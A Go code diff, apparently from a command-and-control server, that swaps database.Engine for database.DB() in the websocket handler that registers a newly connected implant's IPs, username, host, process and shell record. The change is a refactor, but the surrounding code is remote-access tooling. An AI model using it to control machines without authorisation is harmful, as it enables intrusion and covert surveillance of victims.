@@ -224,7 +224,7 @@ func handleWSConn(ws *websocket.Conn, vkey, salt []byte) {
 			heartbeatTimeout, heartbeatInterval := database.GetListenerHeartbeatConfigByAddr(ws.LocalAddr().String(), "websocket")
 
 			var client database.Clients
-			exsists, _ := database.Engine.Where("uid = ?", uid).Get(&client)
+			exsists, _ := database.DB().Where("uid = ?", uid).Get(&client)
 			if !exsists { // FirstBlood
 				processID := binary.BigEndian.Uint32(metainfo[:4])
 				flag := int(metainfo[4:5][0])
@@ -270,9 +270,9 @@ func handleWSConn(ws *websocket.Conn, vkey, salt []byte) {
 					arch = "x64"
 				}
 
-				database.Engine.Insert(&database.Clients{Uid: uid, FirstStart: formattedTime, ExternalIP: externalIp, InternalIP: localIP, Username: UserName, Computer: hostName, Process: processName, Pid: strconv.Itoa(int(processID)), Address: address, Arch: arch, Note: "", Sleep: strconv.Itoa(connection.ResolveSleepSeconds(osArray, heartbeatInterval)), Online: "1", Color: "", Listener: "websocket", Os: clientOs, HeartbeatTimeout: heartbeatTimeout, HeartbeatInterval: heartbeatInterval})
-				database.Engine.Insert(&database.Shell{Uid: uid, ShellContent: ""})
-				database.Engine.Insert(&database.Notes{Uid: uid, Note: ""})
+				database.DB().Insert(&database.Clients{Uid: uid, FirstStart: formattedTime, ExternalIP: externalIp, InternalIP: localIP, Username: UserName, Computer: hostName, Process: processName, Pid: strconv.Itoa(int(processID)), Address: address, Arch: arch, Note: "", Sleep: strconv.Itoa(connection.ResolveSleepSeconds(osArray, heartbeatInterval)), Online: "1", Color: "", Listener: "websocket", Os: clientOs, HeartbeatTimeout: heartbeatTimeout, HeartbeatInterval: heartbeatInterval})
+				database.DB().Insert(&database.Shell{Uid: uid, ShellContent: ""})
+				database.DB().Insert(&database.Notes{Uid: uid, Note: ""})
 
 				// 触发客户端上线通知
 				notificationManager := notification.GetNotificationManager()
